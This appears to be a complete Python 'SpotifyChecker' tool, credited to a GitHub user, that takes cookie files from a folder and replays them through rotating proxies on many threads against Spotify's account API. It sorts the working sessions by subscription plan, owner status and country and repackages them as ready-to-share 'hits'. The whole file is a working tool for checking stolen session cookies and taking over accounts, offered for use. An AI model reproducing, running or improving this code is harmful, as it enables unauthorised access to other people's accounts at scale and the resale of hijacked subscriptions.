import requests
import os
import shutil
import json
import threading
import random
import sys
import string
from datetime import datetime

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_console_title(title):
    if os.name == 'nt':
        os.system(f'title SpotifyChecker - {title}')
    else:
        sys.stdout.write(f'\033]0;{title}\007')
        sys.stdout.flush()

def create_base_folders():
    base_folders = ["cookies", "failed", "broken"]
    for folder in base_folders:
        if not os.path.exists(folder):
            os.makedirs(folder)
    if not os.path.exists("proxy.txt"):
        with open("proxy.txt", 'w') as f:
            f.write("# Add your proxies here\n")
            f.write("# Format: ip:port or ip:port@user:pass\n")
            f.write("# Example:\n")
            f.write("# 127.0.0.1:8080\n")
            f.write("# 192.168.1.1:3128@username:password\n")

def get_run_folder():
    now = datetime.now()
    return f"run_{now.strftime('%Y-%m-%d_%H-%M-%S')}"

def create_output_folder_when_needed(plan, is_sub_account=None, run_folder=None):
    plan_folder_mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    folder_name = plan_folder_mapping.get(plan, "Unknown")
    plans_with_subfolders = ["family_premium_v2", "duo_premium", "family_basic"]
    if plan in plans_with_subfolders:
        if is_sub_account is False:
            sub_folder = "owner_account"
        elif is_sub_account is True:
            sub_folder = "non_owner_account"
        else:
            sub_folder = "unknown"
        output_path = os.path.join("hits", run_folder, folder_name, sub_folder)
    else:
        output_path = os.path.join("hits", run_folder, folder_name)
    if not os.path.exists(output_path):
        os.makedirs(output_path)
    return output_path

def load_proxies():
    proxies = []
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    try:
                        if '@' in line:
                            proxy_auth, proxy_addr = line.split('@')
                            user, password = proxy_auth.split(':')
                            ip, port = proxy_addr.split(':')
                            proxy = {
                                'http': f'http://{user}:{password}@{ip}:{port}',
                                'https': f'http://{user}:{password}@{ip}:{port}'
                            }
                        else:
                            ip, port = line.split(':')
                            proxy = {
                                'http': f'http://{ip}:{port}',
                                'https': f'http://{ip}:{port}'
                            }
                        proxies.append(proxy)
                    except:
                        continue
    return proxies

def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "family_basic": "Family Basic",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "basic_premium": "Premium Basic",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium-Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")

def random_number_string(length=8):
    return ''.join(random.choices(string.digits, k=length))

def format_value(val):
    if not val or str(val).lower() == "unknown":
        return random_number_string()
    return val

def format_cookie_file(data, cookie_content):
    plan = format_value(plan_name_mapping(data.get("currentPlan", "unknown")))
    country = format_value(data.get("country", "unknown"))
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"
    owner = "True" if not data.get("isSubAccount", True) else "False"
    header = (
        f"Plan: {plan}\n"
        f"Country: {country}\n"
        f"Autopay: {auto_pay}\n"
        f"Trial: {trial}\n"
        f"Owner: {owner}\n"
        "Checker By: github.com/harshitkamboj\n"
        "Spotify COOKIE :👇\n\n\n"
    )
    return header + cookie_content.strip() + "\n"

def generate_filename(country, plan_name):
    safe_plan = plan_name.replace(' ', '-').replace('_', '-')
    safe_country = country.replace(' ', '-').replace('_', '-')
    randnum = random_number_string()
    return f"{safe_country}_github-harshitkamboj_{safe_plan}_{randnum}.txt"

def convert_json_to_netscape(json_data):
    netscape_lines = []
    for cookie in json_data:
        domain = cookie.get('domain', '')
        tail_match = "TRUE" if domain.startswith('.') else "FALSE"
        path = cookie.get('path', '/')
        secure = "TRUE" if cookie.get('secure', False) else "FALSE"
        expires = str(cookie.get('expirationDate', 0))
        name = cookie.get('name', '')
        value = cookie.get('value', '')
        line = f"{domain}\t{tail_match}\t{path}\t{secure}\t{expires}\t{name}\t{value}"
        netscape_lines.append(line)
    return '\n'.join(netscape_lines)

def print_status_message(status, cookie_file, folder_name):
    color_codes = {
        'success': '\033[33m',
        'free': '\033[34m',
        'failed': '\033[31m',
        'error': '\033[31m'
    }
    reset_code = '\033[0m'
    base_path = f"cookies\\{cookie_file}"
    if status == 'success':
        print(f"> {color_codes[status]}Login successful with {base_path}. Moved to hits folder!{reset_code}")
    elif status == 'free':
        print(f"> {color_codes[status]}Login successful with {base_path}. But the user is not subscribed. Moved to free folder!{reset_code}")
    elif status == 'failed':
        print(f"> {color_codes[status]}Login failed with {base_path}. Moved to failed folder!{reset_code}")
    elif status == 'error':
        print(f"> {color_codes[status]}Error occurred with {base_path}. Moved to broken folder!{reset_code}")

def checkCookies(num_threads=1):
    counts = {'hits': 0, 'free': 0, 'bad': 0, 'errors': 0}
    proxies = load_proxies()
    cookies_list = os.listdir("cookies") if os.path.exists("cookies") else []
    cookies_total = len(cookies_list)
    cookies_left = [cookies_total]
    def update_title():
        set_console_title(f"CookiesLeft {cookies_left[0]}/{cookies_total} Good {counts['hits']} Free {counts['free']} Failed {counts['bad']}")
    update_title()
    print(f"Total cookies: {cookies_total}")
    print(f"Total proxies: {len(proxies)}")
    print(f"Number of threads: {num_threads}")
    print("\nStarting cookie checking...\n")
    run_folder = get_run_folder()
    header_lock = threading.Lock()
    def checkCookie(cookie_file):
        try:
            cookie_path = os.path.join("cookies", cookie_file)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                content = f.read()
            try:
                cookies_json = json.loads(content)
                netscape_content = convert_json_to_netscape(cookies_json)
                cookies = {}
                for line in netscape_content.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value
            except:
                netscape_content = content
                cookies = {}
                for line in content.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value
            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({'Accept-Encoding': 'identity'})
            proxy = random.choice(proxies) if proxies else None
            response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", proxies=proxy, timeout=15)
            if response.status_code == 200:
                data = response.json()
                current_plan = data.get("currentPlan", "unknown")
                country = data.get("country", "unknown")
                plan_display_name = plan_name_mapping(current_plan)
                if current_plan == "free":
                    counts['free'] += 1
                    print_status_message('free', cookie_file, 'free')
                else:
                    counts['hits'] += 1
                    print_status_message('success', cookie_file, 'hits')
                is_sub_account = data.get("isSubAccount")
                output_path = create_output_folder_when_needed(current_plan, is_sub_account, run_folder)
                new_filename = generate_filename(country, plan_display_name)
                formatted_cookie = format_cookie_file(data, netscape_content)
                output_file = os.path.join(output_path, new_filename)
                with open(output_file, 'w', encoding='utf-8') as out_f:
                    out_f.write(formatted_cookie)
                os.remove(cookie_path)
            else:
                counts['bad'] += 1
                print_status_message('failed', cookie_file, 'failed')
                shutil.move(cookie_path, os.path.join("failed", cookie_file))
        except Exception:
            counts['errors'] += 1
            print_status_message('error', cookie_file, 'broken')
            try:
                shutil.move(cookie_path, os.path.join("broken", cookie_file))
            except:
                pass
        with header_lock:
            cookies_left[0] -= 1
            update_title()
    def worker():
        while True:
            try:
                cookie = cookies_list.pop(0)
            except IndexError:
                break
            checkCookie(cookie)
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    set_console_title(f"SpotifyChecker - Finished Good {counts['hits']} Free {counts['free']} Failed {counts['bad']} Errors {counts['errors']}")
    print("\n\nFinished Checking")
    print(f"Good: \033[33m{counts['hits']}\033[0m - "
          f"Free: \033[34m{counts['free']}\033[0m - "
          f"Bad: \033[31m{counts['bad']}\033[0m - "
          f"Errors: \033[31m{counts['errors']}\033[0m")

def main():
    create_base_folders()
    clear_screen()
    print("""
        ██████████████████████████████████████████████████████████████████████████████████
        █─▄▄▄▄█▄─▄▄─█─▄▄─█─▄─▄─█▄─▄█▄─▄▄─█▄─█─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
        █▄▄▄▄─██─▄▄▄█─██─███─████─███─▄████▄─▄████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
        ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀
                  by https://github.com/harshitkamboj | discord: illuminatis69
                        (Star The Repo 🌟 and Share for more Checkers)

--------------------------------------------------------------------------------------------------

            👉  Welcome, after moving your cookies to (cookies) folder, press  👈
                              Enter if you're ready to start!
    """)
    input()
    try:
        num_threads_input = input("Enter number of threads (default 10): ")
        num_threads = int(num_threads_input) if num_threads_input.strip() else 10
        if num_threads < 1 or num_threads > 100:
            raise ValueError
    except ValueError:
        print("Invalid input, using 10 threads as default")
        num_threads = 10
    checkCookies(num_threads)
    input("Press enter to exit\n")

if __name__ == "__main__":
    main()
